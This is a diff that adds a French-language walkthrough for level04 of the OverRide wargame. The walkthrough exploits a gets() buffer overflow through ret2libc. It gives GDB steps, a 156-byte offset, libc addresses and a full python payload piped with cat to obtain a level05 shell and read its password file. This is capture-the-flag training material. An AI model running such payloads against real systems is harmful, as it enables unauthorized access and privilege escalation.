@@ -1,0 +1,98 @@
+# OverRide - Level04 Walkthrough
+
+## 🎯 Objectif
+
+Exploiter une vulnérabilité de type **buffer overflow** dans un programme C pour exécuter un shell via `system("/bin/sh")`, malgré la présence d'une protection avec `ptrace()` bloquant l'usage de `execve`.
+
+---
+
+## 🧪 Étapes
+
+### 1. Observation initiale
+
+```bash
+$ ./level04
+Give me some shellcode, k
+```
+
+On remarque qu’un fork est effectué, puis un `gets()` est appelé dans l'enfant. L’utilisation de `gets()` permet un **buffer overflow**.
+
+---
+
+### 2. Analyse du binaire avec GDB
+
+- Activer le suivi du fork :
+```gdb
+set follow-fork-mode child
+```
+
+- Lancer le binaire et injecter un motif unique pour identifier l’offset d’écrasement de l’EIP :
+```bash
+$ ./level04
+A1B1C1D1E1F1G1H1I1J1K1L1M1N1O1P1Q1R1S1T1U1V1W1X1Y1Z1a1b1c1d1e1f1g1h1i1j1k1l1m1n1o1p1q1r1s1t1u1v1w1x1y1z1A2B2C2D2E2F2G2H2I2J2K2L2M2N2O2P2Q2R2S2T2U2V2W2X2Y2Z2a2b2c2d2e2f2g2h2i2j2k2l2m2n2o2p2q2r2s2t2u2v2w2x2y2z2
+```
+
+Quand le programme crashe :
+```gdb
+info registers eip
+
+```
+
+Exemple de valeur obtenue : `0x32623261` (`a2b2`) → offset = **156**
+
+---
+
+### 3. Trouver les adresses nécessaires (ret2libc)
+
+Dans GDB :
+```gdb
+info function system     => 0xf7e6aed0
+info function exit       => 0xf7e5eb70
+find 0xf7e2c000,0xf7fcc000,"/bin/sh" => 0xf7f897ec
+```
+
+---
+
+### 4. Construction du payload
+
+Structure du payload :
+```
+"A" * 156 +
+adresse system +
+adresse exit +
+adresse "/bin/sh"
+```
+
+Payload brut :
+```python
+python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'
+```
+
+---
+
+### 5. Exploitation avec `cat` et `stdin` (car `execve()` est bloqué par `ptrace`)
+
+Le payload seul ne permet pas d'interaction. On doit chaîner un `cat` :
+```bash
+(python -c 'print "A"*156 + "Ð®æ÷" + "pëå÷" + "ìø÷"'; cat) | ./level04
+```
+
+---
+
+### ✅ Résultat
+
+Une fois le payload injecté :
+```bash
+$ whoami
+level05
+
+$ cat /home/users/level05/.pass
+<le mot de passe s'affiche ici>
+```
+
+---
+
+## 🔚 Conclusion
+
+Le niveau combine une exploitation classique de buffer overflow avec une contrainte de sécurité empêchant l’usage direct de `execve()`. En utilisant un `ret2libc` bien construit et en exploitant le shell ouvert avec `cat`, on contourne proprement la restriction.
+
